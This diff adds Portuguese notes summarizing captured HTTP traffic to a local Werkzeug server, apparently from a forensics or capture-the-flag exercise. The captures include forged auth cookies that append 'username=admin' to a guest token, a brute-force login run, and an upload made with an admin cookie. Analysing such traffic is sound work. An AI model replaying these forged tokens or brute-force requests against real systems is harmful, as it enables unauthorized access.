@@ -1,0 +1,108 @@
+Resumo do ficheiro HTTP:
+
+
+
+
+
+
+
+
+
+
+------------------------------------------------//-----------------------------------------//--------------//-------------------------------
+GET 
+
+HTTP/1.1
+Host: 192.168.1.251
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: auth=dXNlcm5hbWU9Z3Vlc3SAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6CZ1c2VybmFtZT1hZG1pbg==.L4WHdSWa5+ASrB+CXLsmZ/EUClzunq26cw0KG0q7LEM=
+E..9.(@.?.3........z.P/...$.K.J.P.....
+
+HTTP/1.0 200 OK
+Content-Length: 6195
+Set-Cookie: auth=dXNlcm5hbWU9Z3Vlc3Q=.IaRReH75V/N0jyWcxFdIo0qIeNhhC51JqV3SHTH0nJo=; Path=/
+Access-Control-Allow-Origin: *
+Server: Werkzeug/2.0.2 Python/3.9.5
+Date: Thu, 06 Jan 2022 19:16:10 GMT
+E.....@...c....z..../..P..:.y...P. ..
+
+-----------------------------------//-----------------------------------//---------------------//---------------------------//----------------------------------
+GET 
+
+HTTP/1.1
+Host: 192.168.1.251
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: auth=dXNlcm5hbWU9Z3Vlc3SAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwJnVzZXJuYW1lPWFkbWlu.L4WHdSWa5+ASrB+CXLsmZ/EUClzunq26cw0KG0q7LEM=
+E..9b2@.?.T........z.P/.L.Bc../.P.....
+
+HTTP/1.0 200 OK
+Content-Length: 6053
+Access-Control-Allow-Origin: *
+Server: Werkzeug/2.0.2 Python/3.9.5
+Date: Thu, 06 Jan 2022 19:16:10 GMT
+E.....@...c....z..../..P...KL.BcP. .(.
+
+----------------------------------//------------------------------------------------------//-------------------------//----------------//----------------------------
+Brute force: (muitos pacotes destes)
+
+
+POST /logi
+
+HTTP/1.1
+Host: 192.168.1.251
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 22
+E..C..@.?..(.......z.P.7`Ow...HbP.....
+
+HTTP/1.0 401 UNAUTHORIZED
+Content-Length: 37
+Access-Control-Allow-Origin: *
+Server: Werkzeug/2.0.2 Python/3.9.5
+Date: Thu, 06 Jan 2022 19:15:38 GMT
+E..o..@...m....z.....8.Pt&..K...P. .P.
+
+
+-----------------------------------//--------------------------------
+inserção da foto (assinatura)
+
+POST /uploa
+
+HTTP/1.1
+Host: 192.168.1.251
+Connection: keep-alive
+Content-Length: 69190
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.1.251
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryesSoHxBBDFEf2arK
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-GPC: 1
+Referer: http://192.168.1.251/upload
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: auth=dXNlcm5hbWU9YWRtaW4=.UZnFocRq6WhYQF0AnGY8KQZcNbmpAKSwzUSqWURx4Bg=
+Content-Disposition: form-data; name="name"
+Content-Disposition: form-data; name="file"; filename="bg.png"
+Content-Type: image/png
+E..<..@.?..J.......z.P.$.@9.\...P.....
+
+
+HTTP/1.0 302 FOUND
+Content-Length: 208
+Location: http://192.168.1.251/
+Access-Control-Allow-Origin: *
+Server: Werkzeug/2.0.2 Python/3.9.5
+Date: Thu, 06 Jan 2022 19:27:22 GMT
+E..t4.@...?....z.....%.P.wl.@G.nP. ..m
+
